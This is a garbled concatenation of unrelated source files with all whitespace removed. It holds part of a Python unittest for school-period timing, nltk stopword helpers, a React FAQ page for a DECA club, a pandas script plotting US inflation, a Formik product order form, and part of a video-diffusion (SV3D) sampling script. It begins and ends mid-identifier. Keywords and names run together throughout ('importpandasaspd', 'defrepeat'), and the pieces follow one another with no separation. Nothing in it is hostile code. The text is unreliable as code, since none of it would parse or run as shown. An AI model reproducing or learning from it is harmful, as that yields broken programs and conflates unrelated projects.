y.day,12,20),#inbetweenperiodsdatetime(day.year,day.month,day.day,5,0),datetime(day.year,day.month,day.day,10,30),datetime(day.year,day.month,day.day,11,55),#beforeandafterschoolandpassingperiodsdatetime(day.year,day.month,day.day,4,30),datetime(day.year,day.month,day.day,6,25),datetime(day.year,day.month,day.day,9,57),datetime(day.year,day.month,day.day,1,30),]outs=[0,1,0,1,0,1,15/(60+15+23),31/(60+1+30),20/(25+20),None,None,None,None,]fortime,outinzip(times,outs):self.assertEqual(get_period_progress_from_datetime(time),out,msg=f'{time},{out},{get_period_progress_from_datetime(time)}')if__name__=='__main__':unittest.main()#Repetition(notcurrentlyinuse)importnltknltk.download()defrepeat(essay:str)->int:fromnltk.corpusimportstopwordssw=stopwords.words("english")importReactfrom'react';constfaqs=[{question:'WhatisDECAanditsmainobjective?',answer:'DECAisaninternationalassociationofhighschoolandcollegestudentsaimedatpreparingemergingleadersandentrepreneursinmarketing,finance,hospitality,andmanagement.'},{question:'HowcanIjointheDECAclub?',answer:'StudentscanjoinDECAbysigningupduringtheclubrecruitmentperiodatthebeginningoftheacademicyearorcontactingtheclubofficersformoredetails.'},{question:'WhattypesofactivitiesandeventsdoesDECAorganize?',answer:'DECAorganizesavarietyofactivitiesincludingbusinesscompetitions,leadershipconferences,communityserviceprojects,andworkshopswithindustryprofessionals.'},{question:'ArethereanyprerequisitestojoinDECA?',answer:'TherearenospecificprerequisitestojoinDECA.However,akeeninterestinbusiness,entrepreneurship,andleadershipishighlybeneficial.'},{question:'HowdoesDECApreparestudentsforprofessionalcareers?',answer:'DECAprovidespracticalexperiencesthroughcompetitionsandnetworkingevents,helpingstudentsdevelopskillsincommunication,leadership,andbusinessmanagement.'},{question:'WhatareDECAcompetitiveeventslike?',answer:'DECA’scompetitiveeventschallengestudentsinvariousbusinessscenarios,includingroleplays,writtenprojects,andpresentations,judgedbyindustryprofessionals.'},{question:'ArethereleadershipopportunitieswithinDECA?',answer:'Yes,studentscantakeonleadershiprolesatlocal,state,andinternationallevels,gaininginvaluableexperienceinmanagingteams,projects,andevents.'},];exportdefaultfunctionFAQs(){return(<divid="FAQs"className="mx-automax-w-7xlpx-2sm:px-6lg:px-8pb-10"><h1className="text-4xlfont-boldmb-10text-blue-500">FrequentlyAskedQuestions</h1>{faqs.map((faq,index)=>(<divkey={index}className="mb-6"><h2className="text-xlfont-semiboldmb-2">{faq.question}</h2><pclassName="text-mdtext-gray-700">{faq.answer}</p></div>))}</div>);}importpandasaspdimportmatplotlib.pyplotaspltdf=pd.read_excel('data/inflation.xlsx',index_col=0)df.rename({'Jan':1,'Feb':2,'Mar':3,'Apr':4,'May':5,'Jun':6,'Jul':7,'Aug':8,'Sep':9,'Oct':10,'Nov':11,'Dec':12},axis=1,inplace=True)df=df.stack().reset_index()df.rename(columns={'Year':'year','level_1':'month',0:'inflation'},inplace=True)df['date']=pd.to_datetime(df[['year','month']].assign(DAY=1))df.drop(['year','month'],axis=1,inplace=True)df.set_index('date',inplace=True)df.to_csv('data/inflation.csv')#lineplot#redwheninflation>5%df['inflation'].plot()plt.axhline(6,color='red')#horizontalblacklineat0plt.axhline(0,color='black')#drawaverticallineevery15yearsforyearinrange(2022,1900,-15):plt.axvline(pd.to_datetime(f'{year}-01-01'),color='silver',linestyle='--')#plot15-yearmovingaverage#df['inflation'].rolling(15*12).mean().plot()#plot5-yearmovingaveragedf['inflation'].rolling(5*12).mean().plot(color='orange')#labelorangelineas5-yearmovingaverageinboldplt.text(pd.to_datetime('1970-01-01'),-8,'5-yearmovingaverage',color='orange',weight='bold')#labelredlineas6%inboldplt.text(pd.to_datetime('2025-01-01'),6,'6%',color='red',weight='bold')#titlegraphplt.title('UnitedStatesInflation',fontsize=18,weight='bold',pad=20)#labelaxesplt.xlabel('Year',fontsize=14,labelpad=10)plt.ylabel('AnnualizedInflationRate(%)',fontsize=14,labelpad=10)#longestperiodoftimewithinflation>5%threshold=6months=[len(i)foriin''.join((df['inflation']>threshold).astype(int).astype(str).tolist()).split('0')ifi!='']print(max(months)/12)plt.show()#df.to_clipboard()#percentageofstopwords#Takesinanessay(listofwords)andreturnspercentageofstopwordsdefstopWords(essay):fromnltk.corpusimportstopwordsfromnltk.tokenizeimportword_tokenizestop_words=set(stopwords.words('english'))returnround((len([wforwinessayifw.lower()instop_words])/len(essay))*100,2)import{useState}from'react';import{useFormik}from'formik';constOrderForm=({onSubmit})=>{const[attemptedSubmit,setAttemptedSubmit]=useState(false);const[submitting,setSubmitting]=useState(false);constformik=useFormik({initialValues:{name:'',email:'',organization:'',position:'',product:'',quantity:'',address:'',city:'',country:'',state:'',zipcode:'',terms:false,},onSubmit:(values)=>{onSubmit(values);setSubmitting(true);},validate:(values)=>{consterrors={};//CheckifanyoftheinputsareemptyObject.keys(values).forEach((key)=>{if(!values[key]){errors[key]='Required';}});//Checkiftermsandconditionsarecheckedif(!values.terms){errors.terms='Youmustacceptthetermsandconditions';}//CheckifemailisvalidconstemailRegex=/^[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}$/i;if(values.email&&!emailRegex.test(values.email)){errors.email='Invalidemailaddress';}//Checkifzipcodeisa5digitnumberconstzipRegex=/^\d{5}$/;if(values.zipcode&&!zipRegex.test(values.zipcode)){errors.zipcode='Invalidzipcode';}returnerrors;},});return(<divclassName='flexjustify-center'><formclassName='w-fullmd:w-4/5lg:w-1/2bg-whiteshadow-2xlrounded-xlpx-8pt-6pb-8mb-4'onSubmit={formik.handleSubmit}><divclassName='mb-4'><labelclassName='blocktext-gray-700text-smfont-boldmb-2'htmlFor='name'>Name</label><inputclassName='shadowappearance-noneborderroundedw-fullpy-2px-3text-gray-700leading-tightfocus:outline-nonefocus:shadow-outline'type='text'id='name'name='name'onChange={formik.handleChange}value={formik.values['name']}/>{attemptedSubmit&&formik.errors['name']?(<pclassName='text-red-500italic'>{formik.errors['name']}</p>):null}</div><divclassName='mb-4'><labelclassName='blocktext-gray-700text-smfont-boldmb-2'htmlFor='email'>Email</label><inputclassName='shadowappearance-noneborderroundedw-fullpy-2px-3text-gray-700leading-tightfocus:outline-nonefocus:shadow-outline'type='email'id='email'name='email'onChange={formik.handleChange}value={formik.values['email']}/>{attemptedSubmit&&formik.errors['email']?(<pclassName='text-red-500italic'>{formik.errors['email']}</p>):null}</div><divclassName='mb-4'><labelclassName='blocktext-gray-700text-smfont-boldmb-2'htmlFor='organization'>Organization</label><inputclassName='shadowappearance-noneborderroundedw-fullpy-2px-3text-gray-700leading-tightfocus:outline-nonefocus:shadow-outline'type='text'id='organization'name='organization'onChange={formik.handleChange}value={formik.values['organization']}/>{attemptedSubmit&&formik.errors['organization']?(<pclassName='text-red-500italic'>{formik.errors['organization']}</p>):null}</div><divclassName='mb-4'><labelclassName='blocktext-gray-700text-smfont-boldmb-2'htmlFor='position'>Position</label><inputclassName='shadowappearance-noneborderroundedw-fullpy-2px-3text-gray-700leading-tightfocus:outline-nonefocus:shadow-outline'type='text'id='position'name='position'onChange={formik.handleChange}value={formik.values['position']}/>{attemptedSubmit&&formik.errors['position']?(<pclassName='text-red-500italic'>{formik.errors['position']}</p>):null}</div><divclassName='mb-4'><labelclassName='blocktext-gray-700text-smfont-boldmb-2'htmlFor='product'>Product</label><selectclassName='blockappearance-nonew-fullbg-gray-200borderborder-gray-200text-gray-700py-3px-4pr-8roundedleading-tightoutline-nonefocus:bg-gray-50focus:border-gray-200hover:bg-gray-300transition-allduration-200ease-out'id='product'name='product'onChange={formik.handleChange}value={formik.values['product']}><optionvalue=''>Selectaproduct</option><optionvalue='slim-dry-erase'>FinePointDryEraseMarkers</option><optionvalue='large-dry-erase'>LargeChiselTipDryEraseMarkers</option></select>{attemptedSubmit&&formik.errors['product']?(<pclassName='text-red-500italic'>{formik.errors['product']}</p>):null}</div><divclassName='mb-4'><labelclassName='blocktext-gray-700text-smfont-boldmb-2'htmlFor='quantity'>Quantity</label><inputclassName='shadowappearance-noneborderroundedw-fullpy-2px-3text-gray-700leading-tightfocus:outline-nonefocus:shadow-outline'type='number'id='quantity'name='quantity'onChange={formik.handleChange}value={formik.values['quantity']}/>{attemptedSubmit&&formik.errors['quantity']?(<pclassName='text-red-500italic'>{formik.errors['quantity']}</p>):null}</div><divclassName='lg:col-span2'><divclassName='gridgap-4gap-y-2text-smgrid-cols1md:grid-cols-5'><divclassName='md:col-span-3'><labelclassName='blocktext-gray-700text-smfont-boldmb-2'htmlFor='address'>StreetAddress</label><inputclassName='shadowappearance-noneborderroundedw-fullpy-2px-3text-gray-700leading-tightfocus:outline-nonefocus:shadow-outline'id='address'name='address'onChange={formik.handleChange}value={formik.values['address']}/>{attemptedSubmit&&formik.errors['address']?(<pclassName='text-red-500italic'>{formik.errors['address']}</p>):null}</div><divclassName='md:col-span-2'><labelclassName='blocktext-gray-700text-smfont-boldmb-2'htmlFor='city'>City</label><inputclassName='shadowappearance-noneborderroundedw-fullpy-2px-3text-gray-700leading-tightfocus:outline-nonefocus:shadow-outline'id='city'name='city'onChange={formik.handleChange}value={formik.values['city']}/>{attemptedSubmit&&formik.errors['city']?(<pclassName='text-red-500italic'>{formik.errors['city']}</p>):null}</div><divclassName='md:col-span-3'><labelclassName='blocktext-gray-700text-smfont-boldmb-2'htmlFor='country'>Country</label><inputclassName='shadowappearance-noneborderroundedw-fullpy-2px-3text-gray-700leading-tightfocus:outline-nonefocus:shadow-outline'id='country'name='country'onChange={formik.handleChange}value={formik.values['country']}/>{attemptedSubmit&&formik.errors['country']?(<pclassName='text-red-500italic'>{formik.errors['country']}</p>):null}</div><divclassName='md:col-span-1'><labelclassName='blocktext-gray-700text-smfont-boldmb-2'htmlFor='state'>State</label><inputclassName='shadowappearance-noneborderroundedw-fullpy-2px-3text-gray-700leading-tightfocus:outline-nonefocus:shadow-outlineuppercase'id='state'name='state'maxLength={2}onChange={formik.handleChange}value={formik.values['state']}/>{attemptedSubmit&&formik.errors['state']?(<pclassName='text-red-500italic'>{formik.errors['state']}</p>):null}</div><divclassName='md:col-span-1'><labelclassName='blocktext-gray-700text-smfont-boldmb-2'htmlFor='zipcode'>Zipcode</label><inputclassName='shadowappearance-noneborderroundedw-fullpy-2px-3text-gray-700leading-tightfocus:outline-nonefocus:shadow-outline'id='zipcode'name='zipcode'onChange={formik.handleChange}value={formik.values['zipcode']}/>{attemptedSubmit&&formik.errors['zipcode']?(<pclassName='text-red-500italic'>{formik.errors['zipcode']}</p>):null}</div></div></div><divclassName='flexitems-centermy-4'><inputclassName='w-4h-4text-blue-600bg-gray-100border-gray-300roundeddark:ring-offset-gray-800focus:ring-2bg-gray-500dark:border-gray-600m-1'type='checkbox'id='terms'name='terms'onChange={formik.handleChange}checked={formik.values['terms']}/><labelclassName='ml-1text-mdtext-gray-600'htmlFor='terms'>Iacceptthe{''}<ahref='/terms'target='_blank'rel='noopenernoreferrer'className='text-blue-600dark:text-blue-500hover:underline'>termsandconditions</a></label>{attemptedSubmit&&formik.errors['terms']?(<pclassName='text-red-500italicml-4'>{formik.errors['terms']}</p>):null}</div><div><buttonclassName='rounded-mdbg-gradient-to-rfrom-sky-500to-sky-400hover:from-sky-400hover:to-sky-300px-3.5py-2.5text-smfont-semiboldtext-whiteshadow-smhover:bg-indigo-500focus-visible:outlinefocus-visible:outline-2focus-visible:outline-offset-2focus-visible:outline-indigo-600'type='submit'onClick={()=>{setAttemptedSubmit(true);}}>Submit</button>{submitting&&(<pclassName='text-gray-500italicmt-2'>Submittingyourorder.Pleasewaitamoment.</p>)}</div></form></div>);};exportdefaultOrderForm;importmathimportosfromglobimportglobfrompathlibimportPathfromtypingimportDict,List,Optional,Tuple,Unionimportcv2importimageioimportnumpyasnpimporttorchimporttorchvision.transformsasTTfromeinopsimportrearrange,repeatfromomegaconfimportListConfig,OmegaConffromPILimportImage,ImageSequencefromrembgimportremovefromtorchimportautocastfromtorchvision.transformsimportToTensorfromscripts.util.detection.nsfw_and_watermark_dectectionimportDeepFloydDataFilteringfromsgm.modules.autoencoding.temporal_aeimportVideoDecoderfromsgm.modules.diffusionmodules.guidersimport(LinearPredictionGuider,SpatiotemporalPredictionGuider,TrapezoidPredictionGuider,TrianglePredictionGuider,VanillaCFG,)fromsgm.modules.diffusionmodules.samplingimport(DPMPP2MSampler,DPMPP2SAncestralSampler,EulerAncestralSampler,EulerEDMSampler,HeunEDMSampler,LinearMultistepSampler,)fromsgm.utilimportdefault,instantiate_from_configdefload_module_gpu(model):model.cuda()defunload_module_gpu(model):model.cpu()torch.cuda.empty_cache()definitial_model_load(model):model.model.half()returnmodeldefget_resizing_factor(desired_shape:Tuple[int,int],current_shape:Tuple[int,int])->float:r_bound=desired_shape[1]/desired_shape[0]aspect_r=current_shape[1]/current_shape[0]ifr_bound>=1.0:ifaspect_r>=r_bound:factor=min(desired_shape)/min(current_shape)else:ifaspect_r<1.0:factor=max(desired_shape)/min(current_shape)else:factor=max(desired_shape)/max(current_shape)else:ifaspect_r<=r_bound:factor=min(desired_shape)/min(current_shape)else:ifaspect_r>1:factor=max(desired_shape)/min(current_shape)else:factor=max(desired_shape)/max(current_shape)returnfactordefread_gif(input_path,n_frames):frames=[]video=Image.open(input_path)forimginImageSequence.Iterator(video):frames.append(img.convert("RGBA"))iflen(frames)==n_frames:breakreturnframesdefread_mp4(input_path,n_frames):frames=[]vidcap=cv2.VideoCapture(input_path)success,image=vidcap.read()whilesuccess:frames.append(Image.fromarray(cv2.cvtColor(image,cv2.COLOR_BGR2RGB)))success,image=vidcap.read()iflen(frames)==n_frames:breakreturnframesdefsave_img(file_name,img):output_dir=os.path.dirname(file_name)os.makedirs(output_dir,exist_ok=True)imageio.imwrite(file_name,(((img[0].permute(1,2,0)+1)/2).cpu().numpy()*255.0).astype(np.uint8),)defsave_video(file_name,imgs,fps=10):output_dir=os.path.dirname(file_name)os.makedirs(output_dir,exist_ok=True)img_grid=[(((img[0].permute(1,2,0)+1)/2).cpu().numpy()*255.0).astype(np.uint8)forimginimgs]iffile_name.endswith(".gif"):imageio.mimwrite(file_name,img_grid,fps=fps,loop=0)else:imageio.mimwrite(file_name,img_grid,fps=fps)defread_video(input_path:str,n_frames:int,device:str="cuda",):path=Path(input_path)is_video_file=Falseall_img_paths=[]ifpath.is_file():ifany([input_path.endswith(x)forxin[".gif",".mp4"]]):is_video_file=Trueelse:raiseValueError("Pathisnotavalidvideofile.")elifpath.is_dir():all_img_paths=sorted([fforfinpath.iterdir()iff.is_file()andf.suffix.lower()in[".jpg",".jpeg",".png"]])[:n_frames]elif"*"ininput_path:all_img_paths=sorted(glob(input_path))[:n_frames]else:raiseValueErrorifis_video_fileandinput_path.endswith(".gif"):images=read_gif(input_path,n_frames)[:n_frames]elifis_video_fileandinput_path.endswith(".mp4"):images=read_mp4(input_path,n_frames)[:n_frames]else:print(f"Loading{len(all_img_paths)}videoframes...")images=[Image.open(img_path)forimg_pathinall_img_paths]iflen(images)<n_frames:images=(images+images[::-1])[:n_frames]iflen(images)!=n_frames:raiseValueError(f"Inputvideocontainsfewerthan{n_frames}frames.")images_v0=[]forimageinimages:image=ToTensor()(image).unsqueeze(0).to(device)images_v0.append(image*2.0-1.0)returnimages_v0defpreprocess_video(input_path,remove_bg=False,n_frames=21,W=576,H=576,output_folder=None,image_frame_ratio=0.917):print(f"preprocess{input_path}")ifoutput_folderisNone:output_folder=os.path.dirname(input_path)path=Path(input_path)is_video_file=Falseall_img_paths=[]ifpath.is_file():ifany([input_path.endswith(x)forxin[".gif",".mp4"]]):is_video_file=Trueelse:raiseValueError("Pathisnotavalidvideofile.")elifpath.is_dir():all_img_paths=sorted([fforfinpath.iterdir()iff.is_file()andf.suffix.lower()in[".jpg",".jpeg",".png"]])[:n_frames]elif"*"ininput_path:all_img_paths=sorted(glob(input_path))[:n_frames]else:raiseValueErrorifis_video_fileandinput_path.endswith(".gif"):images=read_gif(input_path,n_frames)[:n_frames]elifis_video_fileandinput_path.endswith(".mp4"):images=read_mp4(input_path,n_frames)[:n_frames]else:print(f"Loading{len(all_img_paths)}videoframes...")images=[Image.open(img_path)forimg_pathinall_img_paths]iflen(images)!=n_frames:raiseValueError(f"Inputvideocontains{len(images)}frames,fewerthan{n_frames}frames.")#Removebackgroundfori,imageinenumerate(images):ifremove_bg:ifimage.mode=="RGBA":passelse:#image.thumbnail([W,H],Image.Resampling.LANCZOS)image=remove(image.convert("RGBA"),alpha_matting=True)images[i]=image#Cropvideoframes,assumetheobjectisalreadyinthecenteroftheimagewhite_thresh=250images_v0=[]box_coord=[np.inf,np.inf,0,0]forimageinimages:image_arr=np.array(image)in_w,in_h=image_arr.shape[:2]original_center=(in_w//2,in_h//2)ifimage.mode=="RGBA":ret,mask=cv2.threshold(np.array(image.split()[-1]),0,255,cv2.THRESH_BINARY)else:#assumetheinputimagehaswhitebackgroundret,mask=cv2.threshold((np.array(image).mean(-1)<=white_thresh).astype(np.uint8)*255,0,255,cv2.THRESH_BINARY)x,y,w,h=cv2.boundingRect(mask)box_coord[0]=min(box_coord[0],x)box_coord[1]=min(box_coord[1],y)box_coord[2]=max(box_coord[2],x+w)box_coord[3]=max(box_coord[3],y+h)box_square=max(original_center[0]-box_coord[0],original_center[1]-box_coord[1])box_square=max(box_square,box_coord[2]-original_center[0])box_square=max(box_square,box_coord[3]-original_center[1])x,y,w,h=original_center[0]-box_square,original_center[1]-box_square,2*box_square,2*box_squarebox_size=box_square*2forimageinimages:ifimage.mode=="RGB":image=image.convert("RGBA")image_arr=np.array(image)side_len=(int(box_size/image_frame_ratio)ifimage_frame_ratioisnotNoneelsein_w)padded_image=np.zeros((side_len,side_len,4),dtype=np.uint8)center=side_len//2padded_image[center-box_size//2:center-box_size//2+box_size,center-box_size//2:center-box_size//2+box_size,]=image_arr[x:x+w,y:y+h]rgba=Image.fromarray(padded_image).resize((W,H),Image.LANCZOS)#rgba=image.resize((W,H),Image.LANCZOS)rgba_arr=np.array(rgba)/255.0rgb=rgba_arr[...,:3]*rgba_arr[...,-1:]+(1-rgba_arr[...,-1:])image=(rgb*255).astype(np.uint8)images_v0.append(image)base_count=len(glob(os.path.join(output_folder,"*.mp4")))//12processed_file=os.path.join(output_folder,f"{base_count:06d}_process_input.mp4")imageio.mimwrite(processed_file,images_v0,fps=10)returnprocessed_filedefsample_sv3d(image,num_frames:Optional[int]=None,#21forSV3Dnum_steps:Optional[int]=None,version:str="sv3d_u",fps_id:int=6,motion_bucket_id:int=127,cond_aug:float=0.02,decoding_t:int=14,#Numberofframesdecodedatatime!ThiseatsmostVRAM.Reduceifnecessary.device:str="cuda",polar_rad:Optional[Union[float,List[float]]]=None,azim_rad:Optional[List[float]]=None,verbose:Optional[bool]=False,sv3d_model=None,):"""Simplescripttogenerateasinglesampleconditionedonanimage`input_path`ormultipleimages,oneforeachimagefileinfolder`input_path`.IfyourunoutofVRAM,trydecreasing`decoding_t`."""ifsv3d_modelisNone:ifversion=="sv3d_u":model_config="scripts/sampling/configs/sv3d_u.yaml"elifversion=="sv3d_p":model_config="scripts/sampling/configs/sv3d_p.yaml"else:raiseValueError(f"Version{version}doesnotexist.")model,filter=load_model(model_config,device,num_frames,num_steps,verbose,)else:model=sv3d_modelload_module_gpu(model)H,W=image.shape[2:]F=8C=4shape=(num_frames,C,H//F,W//F)value_dict={}value_dict["cond_frames_without_noise"]=imagevalue_dict["motion_bucket_id"]=motion_bucket_idvalue_dict["fps_id"]=fps_idvalue_dict["cond_aug"]=cond_augvalue_dict["cond_frames"]=image+cond_aug*torch.randn_like(image)if"sv3d_p"inversion:value_dict["polars_rad"]=polar_radvalue_dict["azimuths_rad"]=azim_radwithtorch.no_grad():withtorch.autocast(device):batch,batch_uc=get_batch_sv3d(get_unique_embedder_keys_from_conditioner(model.conditioner),value_dict,[1,num_frames],T=num_frames,device=device,)c,uc=model.conditioner.get_unconditional_conditioning(batch,batch_uc=batch_uc,force_uc_zero_embeddings=["cond_frames","cond_frames_without_noise",],)forkin["crossattn","concat"]:uc[k]=repeat(uc[k],"b...->bt...",t=num_frames)uc[k]=rearrange(uc[k],"bt...->(bt)...",t=num_frames)c[k]=repeat(c[k],"b...->bt...",t=num_frames)c[k]=rearrange(c[k],"bt...->(bt)...",t=num_frames)randn=torch.randn(shape,device=device)additional_model_inputs={}additional_model_inputs["image_only_indicator"]=torch.zeros(2,num_frames).to(device)additional_model_inputs["num_video_frames"]=batch["num_video_frames"]defdenoiser(input,sigma,c):returnmodel.denoiser(model.model,input,sigma,c,**additional_model_inputs)samples_z=model.sampler(denoiser,randn,cond=c,uc=uc)unload_module_gpu(model.model)unload_module_gpu(model.denoiser)model.en_and_decode_n_samples_a_time=decoding_tsamples_x=model.decode_first_stage(samples_z)samples_x[-1:]=value_dict["cond_frames_without_noise"]samples=torch.clamp(samples_x,min=-1.0,max=1.0)unload_module_gpu(model)returnsamplesdefdecode_latents(model,samples_z,img_matrix,frame_indices,view_indices,timesteps):load_module_gpu(model.first_stage_model)fortinframe_indices:forvinview_indices:ift!=0andv!=0:ifisinstance(model.first_stage_model.decoder,VideoDecoder):samples_x=model.decode_first_stage(samples_z[t,v][None],timesteps=timesteps)else:samples_x=model.decode_first_stage(samples_z[t,v][None])samples=torch.clamp((samples_x+1.0)/2.0,min=0.0,max=1.0)img_matrix[t][v]=samples*2-1unload_module_gpu(model.first_stage_model)returnimg_matrixdefinit_embedder_options_no_st(keys,init_dict,prompt=None,negative_prompt=None):#Hardcodeddemosettings;mightundergosomechangesinthefuturevalue_dict={}forkeyinkeys:ifkey=="txt":ifpromptisNone:prompt="Aprofessionalphotographofanastronautridingapig"ifnegative_promptisNone:negative_prompt=""value_dict["prompt"]=promptvalue_dict["negative_prompt"]=negative_promptifkey=="original_size_as_tuple":orig_width=init_dict["orig_width"]orig_height=init_dict["orig_height"]value_dict["orig_width"]=orig_widthvalue_dict["orig_height"]=orig_heightifkey=="crop_coords_top_left":crop_coord_top=0crop_coord_left=0value_dict["crop_coords_top"]=crop_coord_topvalue_dict["crop_coords_left"]=crop_coord_leftifkey=="aesthetic_score":value_dict["aesthetic_score"]=6.0value_dict["negative_aesthetic_score"]=2.5ifkey=="target_size_as_tuple":value_dict["target_width"]=init_dict["target_width"]value_dict["target_height"]=init_dict["target_height"]ifkeyin["fps_id","fps"]:fps=6value_dict["fps"]=fpsvalue_dict["fps_id"]=fps-1ifkey=="motion_bucket_id":mb_id=127value_dict["motion_bucket_id"]=mb_idifkey=="noise_level":value_dict["noise_level"]=0returnvalue_dictdefget_discretization_no_st(discretization,options,key=1):ifdiscretization=="LegacyDDPMDiscretization":discretization_config={"target":"sgm.modules.diffusionmodules.discretizer.LegacyDDPMDiscretization",}elifdiscretization=="EDMDiscretization":sigma_min=options.get("sigma_min",0.03)sigma_max=options.get("sigma_max",14.61)rho=options.get("rho",3.0)discretization_config={"target":"sgm.modules.diffusionmodules.discretizer.EDMDiscretization","params":{"sigma_min":sigma_min,"sigma_max":sigma_max,"rho":rho,},}returndiscretization_configdefget_guider_no_st(options,key):guider=["VanillaCFG","IdentityGuider","LinearPredictionGuider","TrianglePredictionGuider","TrapezoidPredictionGuider","SpatiotemporalPredictionGuider",][options.get("guider",2)]additional_guider_kwargs=(options["additional_guider_kwargs"]if"additional_guider_kwargs"inoptionselse{})ifguider=="IdentityGuider":guider_config={"target":"sgm.modules.diffusionmodules.guiders.IdentityGuider"}elifguider=="VanillaCFG":scale_schedule="Identity"ifscale_schedule=="Identity":scale=options.get("cfg",5.0)scale_schedule_config={"target":"sgm.modules.diffusionmodules.guiders.IdentitySchedule","params":{"scale":scale},}elifscale_schedule=="Oscillating":small_scale=4.0large_scale=16.0sigma_cutoff=1.0scale_schedule_config={"target":"sgm.modules.diffusionmodules.guiders.OscillatingSchedule","params":{"small_scale":small_scale,"large_scale":large_scale,"sigma_cutoff":sigma_cutoff,},}else:raiseNotImplementedErrorguider_config={"target":"sgm.modules.diffusionmodules.guiders.VanillaCFG","params":{"scale_schedule_config":scale_schedule_config,**additional_guider_kwargs,},}elifguider=="LinearPredictionGuider":max_scale=options.get("cfg",1.5)guider_config={"target":"sgm.modules.diffusionmodules.guiders.LinearPredictionGuider","params":{"max_scale":max_scale,"num_frames":options["num_frames"],**additional_guider_kwargs,},}elifguider=="TrianglePredictionGuider":max_scale=options.get("cfg",1.5)period=options.get("period",1.0)period_fusing=options.get("period_fusing","max")guider_config={"target":"sgm.modules.diffusionmodules.guiders.TrianglePredictionGuider","params":{"max_scale":max_scale,"num_frames":options["num_frames"],"period":period,"period_fusing":period_fusing,**additional_guider_kwargs,},}elifguider=="TrapezoidPredictionGuider":max_scale=options.get("cfg",1.5)edge_perc=options.get("edge_perc",0.1)guider_config={"target":"sgm.modules.diffusionmodules.guiders.TrapezoidPredictionGuider","params":{"max_scale":max_scale,"num_frames":options["num_frames"],"edge_perc":edge_perc,**additional_guider_kwargs,},}elifguider=="SpatiotemporalPredictionGuider":max_scale=options.get("cfg",1.5)guider_config={"target":"sgm.modules.diffusionmodules.guiders.SpatiotemporalPredictionGuider","params":{"max_scale":max_scale,"num_frames":options["num_frames"],**additional_guider_kwargs,},}else:raiseNotImplementedErrorreturnguider_configdefget_sampler_no_st(sampler_name,steps,discretization_config,guider_config,key=1):ifsampler_name=="EulerEDMSampler"orsampler_name=="HeunEDMSampler":s_churn=0.0s_tmin=0.0s_tmax=999.0s_noise=1.0ifsampler_name=="EulerEDMSampler":sampler=EulerEDMSampler(num_steps=steps,discretization_config=discretization_config,guider_config=guider_config,s_churn=s_churn,s_tmin=s_tmin,s_tmax=s_tmax,s_noise=s_noise,verbose=False,)elifsampler_name=="HeunEDMSampler":sampler=HeunEDMSampler(num_steps=steps,discretization_config=discretization_config,guider_config=guider_config,s_churn=s_churn,s_tmin=s_tmin,s_tmax=s_tmax,s_noise=s_noise,verbose=False,)elif(sampler_name=="EulerAncestralSampler"orsampler_name=="DPMPP2SAncestralSampler"):s_noise=1.0eta=1.0ifsampler_name=="EulerAncestralSampler":sampler=EulerAncestralSampler(num_steps=steps,discretization_config=discretization_config,guider_config=guider_config,eta=eta,s_noise=s_noise,verbose=False,)elifsampler_name=="DPMPP2SAncestralSampler":sampler=DPMPP2SAncestralSampler(num_steps=steps,discretization_config=discretization_config,guider_config=guider_config,eta=eta,s_noise=s_noise,verbose=False,)elifsampler_name=="DPMPP2MSampler":sampler=DPMPP2MSampler(num_steps=steps,discretization_config=discretization_config,guider_config=guider_config,verbose=False,)elifsampler_name=="LinearMultistepSampler":order=4sampler=LinearMultistepSampler(num_steps=steps,discretization_config=discretization_config,guider_config=guider_config,order=order,verbose=False,)else:raiseValueError(f"unknownsampler{sampler_name}!")returnsamplerdefinit_sampling_no_st(key=1,options:Optional[Dict[str,int]]=None,):options={}ifoptionsisNoneelseoptionsnum_rows,num_cols=1,1steps=options.get("num_steps",40)sampler=["EulerEDMSampler","HeunEDMSampler","EulerAncestralSampler","DPMPP2SAncestralSampler","DPMPP2MSampler","LinearMultistepSampler",][options.get("sampler",0)]discretization=["LegacyDDPMDiscretization","EDMDiscretization",][options.get("discretization",1)]discretization_config=get_discretization_no_st(discretization,options=options,key=key)guider_config=get_guider_no_st(options=options,key=key)sampler=get_sampler_no_st(sampler,steps,discretization_config,guider_config,key=key)returnsampler,num_rows,num_colsdefrun_img2vid(version_dict,model,image,seed=23,polar_rad=[10]*21,azim_rad=np.linspace(0,360,21+1)[1:],cond_motion=None,cond_view=None,decoding_t=None,):options=version_dict["options"]H=version_dict["H"]W=version_dict["W"]T=version_dict["T"]C=version_dict["C"]F=version_dict["f"]init_dict={"orig_width":576,"orig_height":576,"target_width":W,"target_height":H,}ukeys=set(get_unique_embedder_keys_from_conditioner(model.conditioner))value_dict=init_embedder_options_no_st(ukeys,init_dict,negative_prompt=options.get("negative_promt",""),prompt="A3Dmodel.",)if"fps"notinukeys:value_dict["fps"]=6value_dict["is_image"]=0value_dict["is_webvid"]=0value_dict["image_only_indicator"]=0cond_aug=0.00ifcond_motionisnotNone:value_dict["cond_frames_without_noise"]=cond_motionvalue_dict["cond_frames"]=(cond_motion[:,None].repeat(1,cond_view.shape[0],1,1,1).flatten(0,1))value_dict["cond_motion"]=cond_motionvalue_dict["cond_view"]=cond_viewelse:value_dict["cond_frames_without_noise"]=imagevalue_dict["cond_frames"]=image+cond_aug*torch.randn_like(image)value_dict["cond_aug"]=cond_augvalue_dict["polar_rad"]=polar_radvalue_dict["azimuth_rad"]=azim_radvalue_dict["rotated"]=Falsevalue_dict["cond_motion"]=cond_motionvalue_dict["cond_view"]=cond_view#seed_everything(seed)options["num_frames"]=Tsampler,num_rows,num_cols=init_sampling_no_st(options=options)num_samples=num_rows*num_colssamples=do_sample(model,sampler,value_dict,num_samples,H,W,C,F,T=T,batch2model_input=["num_video_frames","image_only_indicator"],force_uc_zero_embeddings=options.get("force_uc_zero_embeddings",None),force_cond_zero_embeddings=options.get("force_cond_zero_embeddings",None),return_latents=False,decoding_t=decoding_t,)returnsamplesdefprepare_inputs(frame_indices,img_matrix,v0,view_indices,model,version_dict,seed,polars,azims):load_module_gpu(model.conditioner)forward_frame_indices=frame_indices.copy()t0=forward_frame_indices[0]image=img_matrix[t0][v0]cond_motion=torch.cat([img_matrix[t][v0]fortinforward_frame_indices],0)cond_view=torch.cat([img_matrix[t0][v]forvinview_indices],0)forward_inputs=prepare_sampling(version_dict,model,image,seed,polars,azims,cond_motion,cond_view,)#backwardsamplingbackward_frame_indices=frame_indices[::-1].copy()t0=backward_frame_indices[0]image=img_matrix[t0][v0]cond_motion=torch.cat([img_matrix[t][v0]fortinbackward_frame_indices],0)cond_view=torch.cat([img_matrix[t0][v]forvinview_indices],0)backward_inputs=prepare_sampling(version_dict,model,image,seed,pola